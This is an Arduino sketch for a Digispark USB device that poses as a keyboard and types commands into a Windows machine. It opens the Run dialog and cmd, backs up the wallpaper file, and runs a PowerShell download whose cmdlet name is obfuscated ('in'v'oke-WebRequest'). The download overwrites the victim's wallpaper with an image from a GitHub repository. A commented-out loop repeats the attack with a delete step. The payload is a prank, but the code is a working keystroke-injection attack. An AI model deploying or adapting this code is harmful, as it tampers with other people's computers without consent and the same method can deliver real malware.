#include "DigiKeyboard.h"
 
void setup() {
  Serial.begin(9600);
  Serial.println("Started");
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("copy %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\TranscodedWallpaper %USERPROFILE%\\CopyOfOriginalWallpaper.jpg");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell.exe in'v'oke-WebRequest 'https://github.com/OnyHoque/Digispark_fun/blob/master/wallpaper.jpg?raw=true' -OutFile '%USERPROFILE%/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper'");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  
}
 
void loop() {
//DigiKeyboard.sendKeyStroke(0);
//DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
//DigiKeyboard.delay(500);
//DigiKeyboard.println("cmd");
//DigiKeyboard.delay(500);
//DigiKeyboard.sendKeyStroke(KEY_ENTER);
//DigiKeyboard.delay(500);
//DigiKeyboard.println("copy %USERPROFILE%/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper %USERPROFILE%/AppData/Roaming/Microsoft/Windows/Themes/CopyOfOriginalWallpaper.jpg");
//DigiKeyboard.delay(2000);
//DigiKeyboard.println("del %USERPROFILE%/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper");
//DigiKeyboard.delay(2000);
//DigiKeyboard.println("powershell.exe in'v'oke-WebRequest 'https://github.com/OnyHoque/Digispark_fun/blob/master/wallpaper.jpg?raw=true' -OutFile '%USERPROFILE%/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper'");
//DigiKeyboard.delay(3600000);


}
